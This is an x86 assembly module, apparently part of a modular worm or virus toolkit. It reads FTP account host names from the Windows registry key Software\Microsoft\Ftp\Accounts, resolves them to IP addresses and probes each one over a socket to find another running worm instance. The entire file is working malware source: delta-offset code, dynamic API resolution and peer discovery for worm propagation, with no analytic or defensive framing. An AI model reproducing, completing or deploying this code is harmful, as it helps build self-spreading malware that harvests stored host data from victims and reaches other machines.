;Descr:	This gen retrieves IP addresses from FTP records stored in registry
;
;Type:	GEN_FINDWORM
;
;INPUT:
;(EBX)	NONE
;
;OUTPUT:
;(EAX)	DWORD	IP address (NULL if error)
;

find_worm_ftp	Proc
	pushad
	@SEH_SetupFrame	<jmp	fwf_seh>

	call	fwf_delta
fwf_delta:
	pop	ebp				;get delta offset

	@pushsz	'ADVAPI32'
	call	esi				;get address of ADVAPI32.DLL
	test	eax,eax
	je	fwf_seh
	xchg	eax,ebx				;to EBX

	@pushsz	'RegEnumKeyExA'
	push	ebx
	call	edi				;and of its APIz...
	mov	[ebp + fwf_RegEnumKeyExA - fwf_delta],eax

	@pushsz	'RegCloseKey'
	push	ebx
	call	edi
	mov	[ebp + fwf_RegCloseKey - fwf_delta],eax

	@pushsz	'RegOpenKeyExA'
	push	ebx
	call	edi
	mov	[ebp + fwf_RegOpenKeyExA - fwf_delta],eax


	@pushsz	'KERNEL32'
	call	esi				;get address of KERNEL32.DLL
	xchg	eax,ebx
	@pushsz	'FreeLibrary'
	push	ebx
	call	edi				;and of its APIz...
	mov	[ebp + fwf_FreeLibrary - fwf_delta],eax
	@pushsz	'LoadLibraryA'
	push	ebx
	call	edi

	@pushsz	'WSOCK32'
	call	eax				;load WSOCK32.DLL
	test	eax,eax
	je	fwf_seh
	xchg	eax,ebx				;address in EBX
	mov	[ebp + fwf_wsock32 - fwf_delta],ebx

	@pushsz	'socket'
	push	ebx
	call	edi				;get addresses of WSOCK32.dll APIz...
	mov	[ebp + fwf_socket - fwf_delta],eax
	@pushsz	'connect'
	push	ebx
	call	edi
	mov	[ebp + fwf_connect - fwf_delta],eax
	@pushsz	'closesocket'
	push	ebx
	call	edi
	mov	[ebp + fwf_closesocket - fwf_delta],eax
	@pushsz	'WSACleanup'
	push	ebx
	call	edi
	mov	[ebp + fwf_WSACleanup - fwf_delta],eax
	@pushsz	'gethostbyname'
	push	ebx
	call	edi
	mov	[ebp + fwf_gethostbyname - fwf_delta],eax
	@pushsz	'WSAStartup'
	push	ebx
	call	edi

	call	@wsadata
	db	398 dup (?)
@wsadata:
	push	101h
	call	eax				;initialize WSOCK32.dll
	test	eax,eax
	jne	fwf_free

	push	0
	push	1
	push	2
	mov	eax,12345678h
fwf_socket = dword ptr $-4
	call	eax				;create socket
	inc	eax
	je	fwf_clean
	dec	eax
	mov	[ebp + fwf_hsocket - fwf_delta],eax


	lea	ecx,[ebp + fwf_key - fwf_delta]
	push	ecx
	push	20000h or 1h or 8h or 10h
	push	0
	@pushsz	'Software\Microsoft\Ftp\Accounts'
	push	80000001h
	mov	eax,12345678h
fwf_RegOpenKeyExA = dword ptr $-4
	call	eax				;open registry key
	test	eax,eax
	jne	fwf_close

	xor	ebx,ebx
	dec	ebx
fwf_loop:
	inc	ebx				;index of sub-key
	and	dword ptr [ebp + fwf_address - fwf_delta],0
	xor	ecx,ecx
	@pushsz	'1234567'
	push	ecx
	push	ecx
	push	ecx
	call	@size
	dd	80
@size:	call	fwf_buf
	db	80 dup (?)
fwf_buf:pop	esi
	push	esi
	push	ebx
	push	12345678h
fwf_key = dword ptr $-4
	mov	eax,12345678h
fwf_RegEnumKeyExA = dword ptr $-4
	call	eax				;get sub-key
	cmp	eax,0EAh
	je	fwf_loop			;next sub-key
	test	eax,eax
	jne	fwf_reg_end			;no more sub-keyz, quit

	push	esi
	mov	eax,12345678h
fwf_gethostbyname = dword ptr $-4
	call	eax				;convert name to IP address
	test	eax,eax
	je	fwf_loop
	mov	eax,[eax+14h]
	mov	eax,[eax]			;IP address in EAX
	mov	[ebp + fwf_address - fwf_delta],eax
						;save it
	push	sizeofsocket
	call	@fwf_socket

		dw	2
		dw	0C200h
fwf_address	dd	0
		db	8 dup (?)

@fwf_socket:
	push	12345678h
fwf_hsocket = dword ptr $-4
	mov	eax,12345678h
fwf_connect = dword ptr $-4
	call	eax				;try to connect to specified IP
	inc	eax
	je	fwf_loop			;error, get next IP

fwf_reg_end:
	push	dword ptr [ebp + fwf_key - fwf_delta]
	mov	eax,12345678h
fwf_RegCloseKey = dword ptr $-4
	call	eax				;close registry key
fwf_close:
	push	dword ptr [ebp + fwf_hsocket - fwf_delta]
	mov	eax,12345678h
fwf_closesocket = dword ptr $-4
	call	eax				;close socket
fwf_clean:
	mov	eax,12345678h
fwf_WSACleanup = dword ptr $-4
	call	eax				;unitialize WSOCK32.dll
fwf_free:
	push	12345678h
fwf_wsock32 = dword ptr $-4
	mov	eax,12345678h
fwf_FreeLibrary = dword ptr $-4
	call	eax				;unload WSOCK32.DLL
fwf_seh:@SEH_RemoveFrame
	popad
	mov	eax,[ebp + fwf_address - fwf_delta]
	ret					;return IP address of another worm in EAX
end_find_worm_ftp:
find_worm_ftp	EndP